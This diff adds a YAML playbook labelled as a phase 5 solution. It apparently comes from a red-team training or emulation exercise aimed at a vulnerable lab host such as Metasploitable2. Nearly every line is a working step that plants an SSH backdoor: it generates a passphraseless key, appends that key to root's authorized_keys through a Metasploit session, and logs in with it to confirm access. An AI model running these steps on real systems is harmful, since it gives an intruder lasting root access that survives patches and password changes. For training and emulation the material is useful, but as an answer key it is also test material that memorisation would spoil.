@@ -1,0 +1,78 @@
+# Phase 5 SOLUTION: Persistence - SSH Authorized Key
+#
+# Uploads an attacker-controlled public key to the target's authorized_keys file.
+# After this, the attacker can SSH in at any time without a password, even if
+# the original vulnerability is patched or the account password is changed.
+#
+# Variables required: $SESSION_NAME, $TARGET
+# Variables set:      $BACKDOOR_PUBKEY
+# ATT&CK: T1098.004 (Account Manipulation: SSH Authorized Keys)
+#
+# NOTE: Requires write access to ~/.ssh/authorized_keys for the target user.
+# If running as root, you can install the key for any user.
+#
+# CLEANUP: Remove /tmp/backdoor_key and /tmp/backdoor_key.pub from the attacker
+# machine and remove the appended line from /root/.ssh/authorized_keys on the target.
+
+commands:
+  # Step 1: Generate a new RSA keypair on the attacker machine.
+  # -N "" sets no passphrase so the key can be used non-interactively.
+  - type: shell
+    cmd: ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ""
+
+  # Step 2: Read the public key into a variable
+  - type: shell
+    cmd: cat /tmp/backdoor_key.pub
+
+  - type: setvar
+    variable: BACKDOOR_PUBKEY
+    cmd: $RESULT_STDOUT
+
+  - type: debug
+    cmd: "Public key to install: $BACKDOOR_PUBKEY"
+
+  # Step 3: Create the .ssh directory on the target (safe to run even if it exists), set permissions to 700
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: mkdir -p  /root/.ssh && chmod 700 /root/.ssh
+    exit_on_error: false
+
+  # Step 4: Append the public key to authorized_keys on the target.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: echo "$BACKDOOR_PUBKEY" >> /root/.ssh/authorized_keys
+    metadata:
+      tactic: "TA0003"
+      technique: "T1098.004"
+      technique_name: "Account Manipulation: SSH Authorized Keys"
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: chmod 600 /root/.ssh/authorized_keys
+
+  # Verify the key is in place
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: cat /root/.ssh/authorized_keys
+
+  # Step 5: Test backdoor access - open a fresh SSH session using the private key.
+  # Adjust username to match the account where the key was installed (root, msfadmin, etc.)
+  # edgecase: If the ssh server ist old like Metasploitable2's, you may need to disable rsa-sha2-256 and rsa-sha2-512 algorithms since they are not supported.
+
+  - type: ssh
+    cmd: id
+    hostname: $TARGET
+    username: root
+    key_filename: /tmp/backdoor_key
+    creates_session: backdoor_ssh
+    disabled_algorithms:
+      pubkeys:
+        - rsa-sha2-256
+        - rsa-sha2-512
+    metadata:
+      tactic: "TA0003"
+      technique: "T1098.004"
+      technique_name: "Account Manipulation: SSH Authorized Keys"
+
+  - type: debug
+    cmd: "Backdoor SSH access confirmed. Logged in as: $RESULT_STDOUT"
